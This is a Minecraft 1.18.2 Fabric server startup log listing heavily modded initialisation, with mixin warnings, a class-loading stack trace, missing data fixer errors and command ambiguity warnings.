[15:22:20] [main/INFO]: SpongePowered MIXIN Subsystem Version=0.8.5 Source=file:/libraries/net/fabricmc/sponge-mixin/0.12.5+mixin.0.8.5/sponge-mixin-0.12.5+mixin.0.8.5.jar Service=Knot/Fabric Env=SERVER
[15:22:20] [main/INFO]: Compatibility level set to JAVA_17
[15:22:21] [main/WARN]: Reference map 'cristellib-common-refmap.json' for cristellib-common.mixins.json could not be read. If this is a development environment you can ignore this message
[15:22:21] [main/INFO]: Preloading Debugify
[15:22:21] [main/INFO]: Done.
[15:22:21] [main/WARN]: Reference map 'fabric-gifts-mod-refmap.json' for gifts.mixins.json could not be read. If this is a development environment you can ignore this message
[15:22:21] [main/WARN]: Reference map 'lava-java-refmap.json' for lavajava.mixins.json could not be read. If this is a development environment you can ignore this message
[15:22:21] [main/WARN]: Reference map 'Modern-Dynamics-refmap.json' for moderndynamics.mixins.json could not be read. If this is a development environment you can ignore this message
[15:22:21] [main/WARN]: Reference map 'plasmovoice-fabric-refmap.json' for plasmovoice.mixins.json could not be read. If this is a development environment you can ignore this message
[15:22:21] [main/WARN]: Reference map 'riding_partners-1.18.2-fabric-refmap.json' for riding_partners.mixins.json could not be read. If this is a development environment you can ignore this message
[15:22:21] [main/WARN]: Reference map 'simplyswords-common-refmap.json' for simplyswords-common.mixins.json could not be read. If this is a development environment you can ignore this message
[15:22:21] [main/WARN]: Reference map 'static-content-refmap.json' for static-content.mixins.json could not be read. If this is a development environment you can ignore this message
[15:22:21] [main/WARN]: Reference map 'sulfurpotassiummod-refmap.json' for sulfurpotassiummod.mixins.json could not be read. If this is a development environment you can ignore this message
[15:22:21] [main/WARN]: Reference map 'yungsbridges.refmap.json' for yungsbridges.mixins.json could not be read. If this is a development environment you can ignore this message
[15:22:21] [main/WARN]: Reference map 'yungsbridges.refmap.json' for yungsbridges_fabric.mixins.json could not be read. If this is a development environment you can ignore this message
[15:22:21] [main/WARN]: Reference map 'yungsextras.refmap.json' for yungsextras.mixins.json could not be read. If this is a development environment you can ignore this message
[15:22:21] [main/WARN]: Reference map 'yungsextras.refmap.json' for yungsextras_fabric.mixins.json could not be read. If this is a development environment you can ignore this message
[15:22:21] [main/WARN]: Error loading class: net/minecraft/class_572 (java.lang.ClassNotFoundException: net/minecraft/class_572)
[15:22:21] [main/WARN]: @Mixin target net.minecraft.class_572 was not found porting_lib.mixins.common.json:accessor.HumanoidModelAccessor from mod porting_lib
[15:22:21] [main/WARN]: Error loading class: net/minecraft/class_1059$class_4007 (java.lang.ClassNotFoundException: net/minecraft/class_1059$class_4007)
[15:22:21] [main/WARN]: @Mixin target net.minecraft.class_1059$class_4007 was not found alloy-forgery.mixins.json:SpriteAtlasTextureDataAccessor from mod alloy_forgery
[15:22:22] [main/WARN]: Error loading class: io/github/apace100/origins/command/OriginCommand (java.lang.ClassNotFoundException: io/github/apace100/origins/command/OriginCommand)
[15:22:22] [main/WARN]: @Mixin target io.github.apace100.origins.command.OriginCommand was not found environmentz.mixins.json:compat.OriginCommandMixin from mod environmentz
[15:22:22] [main/WARN]: Error loading class: io/github/apace100/origins/component/PlayerOriginComponent (java.lang.ClassNotFoundException: io/github/apace100/origins/component/PlayerOriginComponent)
[15:22:22] [main/WARN]: @Mixin target io.github.apace100.origins.component.PlayerOriginComponent was not found environmentz.mixins.json:compat.PlayerOriginComponentMixin from mod environmentz
[15:22:22] [main/WARN]: Error loading class: net/minecraft/class_304 (java.lang.ClassNotFoundException: net/minecraft/class_304)
[15:22:22] [main/WARN]: @Mixin target net.minecraft.class_304 was not found ftblibrary-fabric.mixins.json:KeyMappingAccessor from mod ftblibrary
[15:22:22] [main/INFO]: [minekea][mixins] BCLib is loaded. Disabling EnchantingTableBlockMixin
[15:22:22] [main/WARN]: Error loading class: io/github/apace100/apoli/power/DamageOverTimePower (java.lang.ClassNotFoundException: io/github/apace100/apoli/power/DamageOverTimePower)
[15:22:22] [main/WARN]: Error loading class: net/minecraft/class_1007 (java.lang.ClassNotFoundException: net/minecraft/class_1007)
[15:22:22] [main/WARN]: @Mixin target net.minecraft.class_1007 was not found mythicmetals.mixins.json:PlayerEntityRendererMixin from mod mythicmetals
[15:22:22] [main/WARN]: Error loading class: net/minecraft/class_1078 (java.lang.ClassNotFoundException: net/minecraft/class_1078)
[15:22:22] [main/WARN]: @Mixin target net.minecraft.class_1078 was not found mythicmetals.mixins.json:TranslationStorageMixin from mod mythicmetals
[15:22:22] [main/WARN]: Error loading class: net/minecraft/class_5616 (java.lang.ClassNotFoundException: net/minecraft/class_5616)
[15:22:22] [main/WARN]: @Mixin target net.minecraft.class_5616 was not found registrate-fabric.mixins.json:accessor.BlockEntityRenderersAccessor from mod registrate-fabric
[15:22:22] [main/INFO]: [MemoryLeakFix] Will be applying 3 memory leak fixes!
[15:22:22] [main/INFO]: [MemoryLeakFix] Currently enabled memory leak fixes: [tagKeyLeak, entityMemoriesLeak, biomeTemperatureLeak]
[15:22:23] [main/INFO]: I used the json to destroy the json
[15:22:23] [main/INFO]: Smooth Boot config initialized
[15:22:26] [main/WARN]: @Final field field_6280:Ljava/util/Map; in vinery-common.mixins.json:LivingEntityMixin from mod vinery should be final
[15:22:26] [main/WARN]: Error loading class: org/spongepowered/asm/synthetic/args/Args$5 (java.lang.ClassNotFoundException: org/spongepowered/asm/synthetic/args/Args$5)
org.objectweb.asm.tree.analysis.AnalyzerException: Error at instruction 134: Cannot invoke ""org.spongepowered.asm.mixin.transformer.ClassInfo.hasSuperClass(org.spongepowered.asm.mixin.transformer.ClassInfo)"" because the return value of ""org.spongepowered.asm.mixin.transformer.ClassInfo.forType(org.objectweb.asm.Type, org.spongepowered.asm.mixin.transformer.ClassInfo$TypeLookup)"" is null
        at org.objectweb.asm.tree.analysis.Analyzer.analyze(Analyzer.java:273)
        at org.spongepowered.asm.util.Locals.generateLocalVariableTable(Locals.java:859)
        at org.spongepowered.asm.util.Locals.getGeneratedLocalVariableTable(Locals.java:828)
        at org.spongepowered.asm.util.Locals.getLocalVariableAt(Locals.java:782)
        at org.spongepowered.asm.util.Locals.getLocalVariableAt(Locals.java:752)
        at org.spongepowered.asm.util.Locals.getLocalsAt(Locals.java:545)
        at org.spongepowered.asm.util.Locals.getLocalsAt(Locals.java:336)
        at org.spongepowered.asm.mixin.injection.callback.CallbackInjector.preInject(CallbackInjector.java:479)
        at org.spongepowered.asm.mixin.injection.code.Injector.preInject(Injector.java:258)
        at org.spongepowered.asm.mixin.injection.struct.InjectionInfo.preInject(InjectionInfo.java:436)
        at org.spongepowered.asm.mixin.transformer.MixinTargetContext.applyInjections(MixinTargetContext.java:1370)
        at org.spongepowered.asm.mixin.transformer.MixinApplicatorStandard.applyInjections(MixinApplicatorStandard.java:1062)
        at org.spongepowered.asm.mixin.transformer.MixinApplicatorStandard.applyMixin(MixinApplicatorStandard.java:402)
        at org.spongepowered.asm.mixin.transformer.MixinApplicatorStandard.apply(MixinApplicatorStandard.java:327)
        at org.spongepowered.asm.mixin.transformer.TargetClassContext.apply(TargetClassContext.java:421)
        at org.spongepowered.asm.mixin.transformer.TargetClassContext.applyMixins(TargetClassContext.java:403)
        at org.spongepowered.asm.mixin.transformer.MixinProcessor.applyMixins(MixinProcessor.java:363)
        at org.spongepowered.asm.mixin.transformer.MixinTransformer.transformClass(MixinTransformer.java:234)
        at org.spongepowered.asm.mixin.transformer.MixinTransformer.transformClassBytes(MixinTransformer.java:202)
        at net.fabricmc.loader.impl.launch.knot.KnotClassDelegate.getPostMixinClassByteArray(KnotClassDelegate.java:422)
        at net.fabricmc.loader.impl.launch.knot.KnotClassDelegate.tryLoadClass(KnotClassDelegate.java:323)
        at net.fabricmc.loader.impl.launch.knot.KnotClassDelegate.loadClass(KnotClassDelegate.java:218)
        at net.fabricmc.loader.impl.launch.knot.KnotClassLoader.loadClass(KnotClassLoader.java:112)
        at java.base/java.lang.ClassLoader.loadClass(ClassLoader.java:521)
        at net.minecraft.class_5872.<clinit>(class_5872.java:9)
        at net.minecraft.class_5871.method_33968(class_5871.java:16)
        at com.mojang.serialization.codecs.RecordCodecBuilder.mapCodec(RecordCodecBuilder.java:76)
        at net.minecraft.class_5871.<clinit>(class_5871.java:12)
        at net.minecraft.class_2939.<clinit>(class_2939.java:33)
        at net.minecraft.class_5463.<clinit>(class_5463.java:19)
        at net.minecraft.class_5458.method_30572(class_5458.java:52)
        at net.minecraft.class_5458.method_30566(class_5458.java:86)
        at java.base/java.util.LinkedHashMap.forEach(LinkedHashMap.java:729)
        at net.minecraft.class_5458.<clinit>(class_5458.java:85)
        at net.minecraft.class_2378.<clinit>(class_2378.java:291)
        at net.minecraft.class_2966.method_12851(class_2966.java:49)
        at net.minecraft.server.Main.main(Main.java:98)
        at net.fabricmc.loader.impl.game.minecraft.MinecraftGameProvider.launch(MinecraftGameProvider.java:468)
        at net.fabricmc.loader.impl.launch.knot.Knot.launch(Knot.java:74)
        at net.fabricmc.loader.impl.launch.knot.KnotServer.main(KnotServer.java:23)
        at net.fabricmc.loader.impl.launch.server.FabricServerLauncher.main(FabricServerLauncher.java:69)
        at net.fabricmc.installer.ServerLauncher.main(ServerLauncher.java:69)
Caused by: java.lang.NullPointerException: Cannot invoke ""org.spongepowered.asm.mixin.transformer.ClassInfo.hasSuperClass(org.spongepowered.asm.mixin.transformer.ClassInfo)"" because the return value of ""org.spongepowered.asm.mixin.transformer.ClassInfo.forType(org.objectweb.asm.Type, org.spongepowered.asm.mixin.transformer.ClassInfo$TypeLookup)"" is null
        at org.spongepowered.asm.util.asm.MixinVerifier.isAssignableFrom(MixinVerifier.java:104)
        at org.objectweb.asm.tree.analysis.SimpleVerifier.isSubTypeOf(SimpleVerifier.java:212)
        at org.objectweb.asm.tree.analysis.BasicVerifier.naryOperation(BasicVerifier.java:400)
        at org.objectweb.asm.tree.analysis.BasicVerifier.naryOperation(BasicVerifier.java:44)
        at org.objectweb.asm.tree.analysis.Frame.executeInvokeInsn(Frame.java:682)
        at org.objectweb.asm.tree.analysis.Frame.execute(Frame.java:609)
        at org.objectweb.asm.tree.analysis.Analyzer.analyze(Analyzer.java:165)
        ... 41 more
[15:22:28] [main/INFO]: wither_cage_fix.mixins.json:WitherEntityMixin from mod wither_cage_fix->@Accessor[FIELD_GETTER]::getTRACKED_ENTITY_IDS()Ljava/util/List; should be static as its target is
[15:22:30] [main/WARN]: @Redirect conflict. Skipping immersive_weathering-common.mixins.json:LevelChunkMixin from mod immersive_weathering->@Redirect::warn(Lorg/slf4j/Logger;Ljava/lang/String;Ljava/lang/Object;Ljava/lang/Object;)V with priority 1000, already redirected by immersive_weathering.mixins.json:LevelChunkMixin from mod immersive_weathering->@Redirect::warn(Lorg/slf4j/Logger;Ljava/lang/String;Ljava/lang/Object;Ljava/lang/Object;)V with priority 1000
[15:22:31] [main/WARN]: Method overwrite conflict for method_7836 in minekea.mixins.json:MilkBucketItemMixin from mod minekea, previously written by io.github.tropheusj.milk.mixin.MilkBucketItemMixin. Skipping method.
[15:22:31] [main/WARN]: Method overwrite conflict for method_7731 in minekea.mixins.json:MilkBucketItemMixin from mod minekea, previously written by io.github.tropheusj.milk.mixin.MilkBucketItemMixin. Skipping method.
[15:22:31] [main/WARN]: Method overwrite conflict for playEmptyingSound in minekea.mixins.json:MilkBucketItemMixin from mod minekea, previously written by io.github.tropheusj.milk.mixin.MilkBucketItemMixin. Skipping method.
[15:22:32] [main/ERROR]: onLoad
[15:22:32] [main/ERROR]: waystonecopy
[15:22:33] [main/INFO]: [bclib] Added Config betternether.main to auto sync (file hash)
[15:22:33] [main/INFO]: [bclib] Added Config betternether.generator to auto sync (file hash)
[15:22:33] [main/INFO]: [bclib] Added Config betternether.blocks to auto sync (file hash)
[15:22:33] [main/INFO]: [bclib] Added Config betternether.items to auto sync (file hash)
[15:22:33] [main/INFO]: [bclib] Added Config betternether.biomes to auto sync (file hash)
[15:22:33] [main/INFO]: [bclib] Added Config betternether.mobs to auto sync (file hash)
[15:22:33] [main/INFO]: [bclib] Added Config betternether.recipes to auto sync (file hash)
[15:22:33] [main/INFO]: [bclib] Added Config bclib.main to auto sync (content diff)
[15:22:33] [main/INFO]: [bclib] Added Config bclib.recipes to auto sync (file hash)
[15:22:35] [main/INFO]: [Animal Feeding Trough] Load Complete! Enjoy :D
[15:22:36] [main/INFO]: [bclib] Added Config betterend.entities to auto sync (file hash)
[15:22:36] [main/INFO]: [bclib] Added Config betterend.blocks to auto sync (file hash)
[15:22:36] [main/INFO]: [bclib] Added Config betterend.items to auto sync (file hash)
[15:22:36] [main/INFO]: [bclib] Added Config betterend.biomes to auto sync (file hash)
[15:22:36] [main/INFO]: [bclib] Added Config betterend.recipes to auto sync (file hash)
[15:22:36] [main/INFO]: [bclib] Added Config betterend.enchantments to auto sync (file hash)
[15:22:44] [main/INFO]: Reflections took 96 ms to scan 1 urls, producing 1 keys and 2 values
[15:22:44] [main/INFO]: Reflections took 3 ms to scan 1 urls, producing 1 keys and 2 values
[15:22:44] [main/INFO]: [betternether] =^..^=    BetterNether for 1.18.2    =^..^=
[15:22:45] [main/INFO]: Reflections took 1 ms to scan 1 urls, producing 1 keys and 2 values
[15:22:45] [main/INFO]: Reflections took 2 ms to scan 1 urls, producing 1 keys and 2 values
[15:22:46] [main/INFO]: Registering C2S receiver with id biomemakeover:cl_complete_quest
[15:22:46] [main/INFO]: Registering C2S receiver with id biomemakeover:update_dir_data
[15:22:47] [main/ERROR]: No data fixer registered for botania:mana_burst
[15:22:47] [main/ERROR]: No data fixer registered for botania:pixie
[15:22:47] [main/ERROR]: No data fixer registered for botania:flame_ring
[15:22:47] [main/ERROR]: No data fixer registered for botania:vine_ball
[15:22:47] [main/ERROR]: No data fixer registered for botania:doppleganger
[15:22:47] [main/ERROR]: No data fixer registered for botania:magic_landmine
[15:22:47] [main/ERROR]: No data fixer registered for botania:spark
[15:22:47] [main/ERROR]: No data fixer registered for botania:thrown_item
[15:22:47] [main/ERROR]: No data fixer registered for botania:magic_missile
[15:22:47] [main/ERROR]: No data fixer registered for botania:thorn_chakram
[15:22:47] [main/ERROR]: No data fixer registered for botania:corporea_spark
[15:22:47] [main/ERROR]: No data fixer registered for botania:ender_air_bottle
[15:22:47] [main/ERROR]: No data fixer registered for botania:pool_minecart
[15:22:47] [main/ERROR]: No data fixer registered for botania:pink_wither
[15:22:47] [main/ERROR]: No data fixer registered for botania:player_mover
[15:22:47] [main/ERROR]: No data fixer registered for botania:mana_storm
[15:22:47] [main/ERROR]: No data fixer registered for botania:babylon_weapon
[15:22:47] [main/ERROR]: No data fixer registered for botania:falling_star
[15:22:47] [main/ERROR]: No data fixer registered for botania:ender_air
[15:22:47] [main/INFO]: Loading CommandSpy by samo_lego.
[15:22:47] [main/INFO]: Combining the Modifiers...
[15:22:47] [main/INFO]: Loading Collective version 6.53.
июн. 18, 2023 3:22:48 PM space.ryzhenkov.colorfulanvils.ColorfulAnvils onInitialize
INFO: Time to bring color juice for anvils!
[15:22:54] [main/WARN]: Encountered duplicate API provider registration for item: minecraft:glass_bottle
[15:22:54] [main/WARN]: Encountered duplicate API provider registration for item: minecraft:bucket
[15:22:54] [main/WARN]: Encountered duplicate API provider registration for item: minecraft:bucket
[15:22:54] [main/WARN]: Encountered duplicate API provider registration for item: minecraft:glass_bottle
[15:22:54] [main/WARN]: Encountered duplicate API provider registration for item: minecraft:bucket
[15:22:54] [main/INFO]: dumping Runtime Pack's assets and data
[15:22:54] [main/INFO]: Initializing rain onto crops
[15:22:55] [main/INFO]: Cursery initialized
[15:22:55] [main/INFO]: Successfully Debugify'd your game!
[15:22:55] [main/INFO]: Proudly fixes 33 bugs!
[15:22:55] [main/INFO]: [EasyAuth]: EasyAuth mod by samo_lego, NikitaCartes.
[15:22:55] [main/INFO]: [EasyWhitelist] Whitelist is now name-based.
[15:22:55] [main/INFO]: Channelling eldritch energies...
[15:22:55] [main/INFO]: Enhanced Celestials registered: Registry[ResourceKey[minecraft:root / minecraft:sound_event] (Experimental)]
[15:22:55] [main/INFO]: Initializing enhancedcelestials network...
[15:22:55] [main/INFO]: Initialized enhancedcelestials network!
[15:22:55] [main/INFO]: Tech Reborn detected, adding Armor Plates
[15:22:55] [main/INFO]: Gobber2 detected, adding Armor Plates
[15:22:55] [main/INFO]: Mythic Metals detected, adding Armor Plates
[15:22:55] [main/INFO]: Botania detected, adding Armor Plates
[15:22:55] [main/INFO]: Better Nether detected, adding Armor Plates
[15:22:55] [main/INFO]: Better End detected, adding Armor Plates
[15:22:55] [main/INFO]: Fabricatech setup done!
[15:22:55] [main/INFO]: Registering C2S receiver with id ftblibrary:edit_nbt_response
[15:22:56] [main/INFO]: Registering C2S receiver with id ftbquests:submit_task
[15:22:56] [main/INFO]: Registering C2S receiver with id ftbquests:claim_reward
[15:22:56] [main/INFO]: Registering C2S receiver with id ftbquests:get_emergency_items
[15:22:56] [main/INFO]: Registering C2S receiver with id ftbquests:claim_all_rewards
[15:22:56] [main/INFO]: Registering C2S receiver with id ftbquests:claim_choice_reward
[15:22:56] [main/INFO]: Registering C2S receiver with id ftbquests:toggle_pinned
[15:22:56] [main/INFO]: Registering C2S receiver with id ftbquests:toggle_chapter_pinned
[15:22:56] [main/INFO]: Registering C2S receiver with id ftbquests:toggle_editing_mode
[15:22:56] [main/INFO]: Registering C2S receiver with id ftbquests:force_save
[15:22:56] [main/INFO]: Registering C2S receiver with id ftbquests:set_custom_image
[15:22:56] [main/INFO]: Registering C2S receiver with id ftbquests:task_screen_config_resp
[15:22:56] [main/INFO]: Registering C2S receiver with id ftbquests:change_progress
[15:22:56] [main/INFO]: Registering C2S receiver with id ftbquests:create_object
[15:22:56] [main/INFO]: Registering C2S receiver with id ftbquests:create_task_at
[15:22:56] [main/INFO]: Registering C2S receiver with id ftbquests:delete_object
[15:22:56] [main/INFO]: Registering C2S receiver with id ftbquests:edit_object
[15:22:56] [main/INFO]: Registering C2S receiver with id ftbquests:move_chapter
[15:22:56] [main/INFO]: Registering C2S receiver with id ftbquests:move_quest
[15:22:56] [main/INFO]: Registering C2S receiver with id ftbquests:change_chapter_group
[15:22:56] [main/INFO]: Registering C2S receiver with id ftbquests:move_chapter_group
[15:22:56] [main/INFO]: Registering C2S receiver with id ftbquests:copy_quest
[15:22:56] [main/INFO]: Registering C2S receiver with id ftbquests:copy_chapter_image
[15:22:56] [main/INFO]: Registering C2S receiver with id ftbteams:open_gui
[15:22:56] [main/INFO]: Registering C2S receiver with id ftbteams:update_settings
[15:22:56] [main/INFO]: Registering C2S receiver with id ftbteams:send_message
[15:22:56] [main/INFO]: Registering C2S receiver with id ftbteams:create_party
[15:22:56] [main/INFO]: Registering C2S receiver with id ftbteams:player_gui_operation
[15:22:56] [main/INFO]: [net.arstov.gifts.item.ModItems] registering Mod Items for gifts
[15:22:56] [main/INFO]: Hello Fabric world!
[15:22:56] [ForkJoinPool.commonPool-worker-1/ERROR]: Couldn't get latest version!
[15:22:56] [main/ERROR]: No data fixer registered for immersive_weathering:falling_icicle
[15:22:56] [main/ERROR]: No data fixer registered for immersive_weathering:falling_layer
[15:22:56] [main/INFO]: Initializing InertiaAntiCheat!
[15:22:56] [main/INFO]: Registering C2S receiver with id itemfilters:main/14e7fa1454283aec8ae811ef844ada28
[15:22:56] [main/INFO]: Registering C2S receiver with id itemfilters:main/8f6a899247753217b9d86ab427a2b279
[15:22:56] [main/WARN]: Ksyxis will speedup your world loading. :P
[15:22:56] [main/WARN]: BUT IT MAY CAUSE ISSUES (INCLUDING COMPAT). DON'T ASK OTHER MODS' AUTHORS FOR COMPAT!
[15:22:56] [main/INFO]: Brewing Lava Java.
[15:22:57] [main/INFO]: Initialize mod Library Ferret
[15:22:57] [main/INFO]: Initialized mod Library Ferret
[15:22:57] [main/INFO]: LMPCompat Loading...
[15:22:57] [main/INFO]: LMPCompat Loading Create-LMP compatibility
[15:22:58] [main/INFO]: [minekea] Initializing server networking
[15:22:58] [main/INFO]: [minekea] Registering block and item tags
[15:22:58] [main/INFO]: [minekea] Registering blocks
[15:22:59] [main/INFO]: [minekea] Registering entities
[15:22:59] [main/INFO]: [minekea] Registering items
[15:22:59] [main/INFO]: [minekea] Registering colored blocks
[15:22:59] [main/INFO]: [minekea] Registering dynamic resource pack
[15:23:00] [main/INFO]: Done initializing MiniMOTD
[15:23:00] [main/INFO]: Initializing MirinsStudiosMod
[15:23:00] [main/INFO]: Definitely not up to no good
[15:23:00] [main/INFO]: Registering C2S receiver with id mobfarmutilities:main/0c090ef07e1c3fbc85c779d67f161e8a
[15:23:00] [main/INFO]: Registering C2S receiver with id mobfarmutilities:main/b2c863635d743df1b59feed1301f5fc3
[15:23:00] [main/INFO]: Registering C2S receiver with id mobfarmutilities:main/02e9cb6fc957377987d3318d86599209
[15:23:00] [main/INFO]: Registering C2S receiver with id mobfarmutilities:main/8e3bf8cb9f5139ed99608b82f09ffd46
[15:23:00] [main/INFO]: Successfully loaded Modern Dynamics!
[15:23:00] [main/INFO]: [nourl.mythicmetals.MythicMetals] SimplySwords: Detected Mythic Metals - injecting compatibility init
[15:23:00] [main/INFO]: [net.sweenus.simplyswords.SimplySwords]
[15:23:00] [main/INFO]: Registering Mythic Metals compat Items for simplyswords
[15:23:00] [main/INFO]: [Mythic Metals] Mythic Metals is now initialized.
[15:23:00] [main/INFO]:
                     ==     =-
                     ==    ==
               ==    ========     =-
                =============== -=
               :==================
           ==+=====================   =           #####   ######   ##  ##     ##       ####   ######     ##     #######  ######
            ==========================           ##   ##  # ## #   ##  ##    ####     ##  ##   ##  ##   ####     ##   #  # ## #
            ==========     ==========            ##   ##    ##     ##  ##   ##  ##   ##        ##  ##  ##  ##    ## #      ##
        +  =========         ========+           ##   ##    ##      ####    ##  ##   ##        #####   ##  ##    ####      ##
        -+=========           ========++++       ##   ##    ##       ##     ######   ##        ## ##   ######    ## #      ##
          ========+           +========+.        ##   ##    ##       ##     ##  ##    ##  ##   ##  ##  ##  ##    ##        ##
          +=======*           *=======*           #####    ####     ####    ##  ##     ####   #### ##  ##  ##   ####      ####
          ========*           +=======*
       *+=-========           =========                       #######  ##   ##    ####    ####    ##   ##  #######
           =========         ========= +=                      ##   #  ###  ##   ##  ##    ##     ###  ##   ##   #
           -=========.     -=========                          ## #    #### ##  ##         ##     #### ##   ## #
          :=========================-                          ####    ## ####  ##         ##     ## ####   ####
          =   =======================-                         ## #    ##  ###  ##  ###    ##     ##  ###   ## #
               ==================    -                         ##   #  ##   ##   ##  ##    ##     ##   ##   ##   #
               =================+                             #######  ##   ##    #####   ####    ##   ##  #######
              =.    ========   .=
                    =     ==
                   *=     =+

[15:23:00] [main/INFO]: Registering C2S receiver with id otyacraftengine:block_entity_instruction
[15:23:00] [main/INFO]: Registering C2S receiver with id otyacraftengine:item_instruction
[15:23:00] [main/INFO]: Early XPlatform Setup
[15:23:00] [main/INFO]: Late XPlatform Setup
[15:23:00] [main/INFO]: Loading Primal Winter Config
[15:23:00] [main/INFO]: Purpeille: Harness the Void!
[15:23:01] [main/INFO]: Constructing common components for mod puzzleslib
[15:23:01] [main/INFO]: registering for pyrotastic
[15:23:01] [main/INFO]: [Quicksort] Initialized
[15:23:01] [main/ERROR]: No data fixer registered for burned
[15:23:01] [main/ERROR]: No data fixer registered for frostbitten
[15:23:01] [main/ERROR]: No data fixer registered for swampy
[15:23:01] [main/ERROR]: No data fixer registered for undead_miner
[15:23:01] [main/ERROR]: No data fixer registered for mummy
[15:23:01] [main/ERROR]: No data fixer registered for glacial_hunter
[15:23:01] [main/ERROR]: No data fixer registered for hunter_wolf
[15:23:01] [main/ERROR]: No data fixer registered for scarab
[15:23:01] [main/ERROR]: No data fixer registered for flying_scarab
[15:23:01] [main/ERROR]: No data fixer registered for dead_beard
[15:23:01] [main/ERROR]: No data fixer registered for zombie_lackey
[15:23:01] [main/ERROR]: No data fixer registered for skeleton_lackey
[15:23:01] [main/ERROR]: No data fixer registered for immortal
[15:23:01] [main/ERROR]: No data fixer registered for zap
[15:23:01] [main/ERROR]: No data fixer registered for primed_tnt_barrel
[15:23:01] [main/ERROR]: No data fixer registered for treasure_chest
[15:23:01] [main/INFO]: Trying to read config file...
[15:23:01] [main/INFO]: A config file was found, loading it..
[15:23:01] [main/INFO]: Successfully loaded config file.
[15:23:01] [main/INFO]: [ServerCore] Initializing...
[15:23:01] [main/INFO]: Registering Gobber compat Items for simplyswords
[15:23:01] [main/INFO]: [com.branders.sulfurpotassiummod.config.ModConfigManager] Reading config values from file.
[15:23:01] [main/INFO]: Loading Towns and Towers!
[15:23:02] [main/INFO]: TechReborn setup done!
[15:23:02] [main/INFO]: Creating registry manager for mod id tradingpost
[15:23:02] [main/INFO]: [ml.pkom.uncraftingtable.Config] [Uncrafting Table].\config
[15:23:02] [main/INFO]: Registering C2S receiver with id uncraftingtable76:network
[15:23:02] [main/INFO]: Loading unstructured
[15:23:02] [main/ERROR]: No data fixer registered for vinery:mule
[15:23:02] [main/ERROR]: No data fixer registered for vinery:wandering_winemaker
[15:23:02] [main/ERROR]: No data fixer registered for vinery:chair
[15:23:02] [main/INFO]: Initializing Void Crafting
[15:23:02] [main/INFO]: [Wired Redstone] Initializing...
[15:23:02] [main/INFO]: [Wired Redstone] Loading common config...
[15:23:02] [main/INFO]: [Wired Redstone] Synchronization will happen during LOGIN phase.
[15:23:02] [main/INFO]: [Wired Redstone] Enabling Create compatibility!
[15:23:02] [main/INFO]: [Wired Redstone] Initialized.
[15:23:02] [main/INFO]: Loaded 5 Static Content files for wolveswitharmor:wolf_armor
[15:23:02] [main/INFO]: Reflections took 3 ms to scan 1 urls, producing 1 keys and 2 values
[15:23:02] [main/INFO]: Reflections took 3 ms to scan 1 urls, producing 1 keys and 2 values
[15:23:03] [main/INFO]: Initializing InertiaAntiCheat!
[15:23:03] [main/WARN]: .\config\InertiaAntiCheat\.\InertiaAntiCheat.toml
[15:23:04] [main/INFO]: Environment: authHost='https://authserver.mojang.com', accountsHost='https://api.mojang.com', sessionHost='https://sessionserver.mojang.com', servicesHost='https://api.minecraftservices.com', name='PROD'
[15:23:04] [main/INFO]: [DataFixerAPI] World Patches are disabled
[15:23:04] [main/INFO]: [betternether] Using legacy (1.17) generator: false
[15:23:04] [main/INFO]: ARRP register - before vanilla
[15:23:04] [main/INFO]: ARRP register - after vanilla
[15:23:05] [main/INFO]: Structure placement for `awesomedungeonnether:nth_blaze_tower/start_pool`: { spacing: 50, separation: 25, salt: 37482856, useValueFromConfiguration: true}
[15:23:05] [main/INFO]: Structure placement for `awesomedungeonnether:nth_center_square/start_pool`: { spacing: 50, separation: 25, salt: 46482856, useValueFromConfiguration: true}
[15:23:05] [main/INFO]: Structure placement for `awesomedungeonnether:nth_giant_crimson_tree/start_pool`: { spacing: 50, separation: 25, salt: 55482856, useValueFromConfiguration: true}
[15:23:05] [main/INFO]: Structure placement for `awesomedungeonnether:nth_obsi_house/start_pool`: { spacing: 50, separation: 25, salt: 64482856, useValueFromConfiguration: true}
[15:23:05] [main/INFO]: Structure placement for `awesomedungeonnether:nth_accum_quad/start_pool`: { spacing: 50, separation: 25, salt: 28482856, useValueFromConfiguration: true}
[15:23:05] [main/INFO]: Structure placement for `awesomedungeonnether:nth_absi_palace/start_pool`: { spacing: 50, separation: 25, salt: 19482856, useValueFromConfiguration: true}
[15:23:06] [main/INFO]: [fabric-registry-sync] Loaded registry data [file 1/4]
[15:23:07] [main/INFO]: Vanilla /weather enabled = false
[15:23:07] [main/WARN]: Ambiguity between arguments [give, targets] and [give, player] with inputs: [Player, 0123]
[15:23:07] [main/WARN]: Ambiguity between arguments [give, player] and [give, targets] with inputs: [Player, 0123]
[15:23:07] [main/WARN]: Ambiguity between arguments [teleport, location] and [teleport, destination] with inputs: [0.1 -0.5 .9, 0 0 0]
[15:23:07] [main/WARN]: Ambiguity between arguments [teleport, location] and [teleport, targets] with inputs: [0.1 -0.5 .9, 0 0 0]
[15:23:07] [main/WARN]: Ambiguity between arguments [teleport, destination] and [teleport, targets] with inputs: [Player, 0123, @e, dd12be42-52a9-4a91-a8a1-11c01849e498]
[15:23:07] [main/WARN]: Ambiguity between arguments [teleport, targets] and [teleport, destination] with inputs: [Player, 0123, dd12be42-52a9-4a91-a8a1-11c01849e498]
[15:23:07] [main/WARN]: Ambiguity between arguments [teleport, targets, location] and [teleport, targets, destination] with inputs: [0.1 -0.5 .9, 0 0 0]
[15:23:07] [main/WARN]: Ambiguity between arguments [ftbteams, info, server_id] and [ftbteams, info, team] with inputs: [server_id]
[15:23:07] [main/WARN]: Ambiguity between arguments [create, coupling, add, cart1] and [create, coupling, add, carts] with inputs: [Player, 0123, @e, dd12be42-52a9-4a91-a8a1-11c01849e498]
[15:23:07] [main/WARN]: Ambiguity between arguments [create, coupling, add, carts] and [create, coupling, add, cart1] with inputs: [Player, 0123, dd12be42-52a9-4a91-a8a1-11c01849e498]
[15:23:07] [main/WARN]: Ambiguity between arguments [create, coupling, add, cart1] and [create, coupling, add, carts] with inputs: [Player, 0123, @e, dd12be42-52a9-4a91-a8a1-11c01849e498]
[15:23:07] [main/WARN]: Ambiguity between arguments [create, coupling, add, carts] and [create, coupling, add, cart1] with inputs: [Player, 0123, dd12be42-52a9-4a91-a8a1-11c01849e498]
[15:23:07] [main/WARN]: Ambiguity between arguments [mod, players] and [mod, amount] with inputs: [0123]
[15:23:07] [main/WARN]: Ambiguity between arguments [mod, amount] and [mod, players] with inputs: [0, -123, 123]
[15:23:07] [main/WARN]: Ambiguity between arguments [bal, playerName] and [bal, player] with inputs: [""quoted phrase"", word]
[15:23:07] [main/WARN]: Ambiguity between arguments [bal, player] and [bal, playerName] with inputs: [Player, 0123, dd12be42-52a9-4a91-a8a1-11c01849e498]
